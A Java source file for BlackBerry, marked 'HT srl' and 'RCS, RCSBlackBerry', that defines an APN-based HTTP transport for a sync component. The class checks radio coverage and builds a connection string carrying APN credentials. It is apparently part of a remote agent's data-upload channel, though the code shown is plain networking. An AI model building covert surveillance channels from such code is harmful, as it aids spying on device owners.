//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.transport;

import net.rim.device.api.system.CoverageInfo;
import net.rim.device.api.system.RadioInfo;
import blackberry.action.Apn;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class ApnTransport extends HttpTransport {

    Apn apn = null;

    //#ifdef DEBUG
    private static Debug debug = new Debug("ApnTransport", DebugLevel.VERBOSE);

    //#endif

    public ApnTransport(String host, Apn apn) {
        super(host);

        this.apn = apn;
    }

    //#ifdef DEBUG
    public String toString() {
        return "ApnTransport " + host + " ( " + apn + ")";
    }
   //#endif

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable");
        //#endif
        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        boolean coverage = CoverageInfo
                .isCoverageSufficient(CoverageInfo.COVERAGE_DIRECT);

        //#ifdef DEBUG
        debug.trace("isAvailable apn: " + gprs + " & " + coverage);
        //#endif

        return coverage & gprs & apn != null && apn.isValid();
    }

    protected String getSuffix() {

        return ";deviceside=true;apn=" + apn.apn + ";tunnelauthusername="
                + apn.user + ";tunnelauthpassword=" + apn.pass;

    }
}
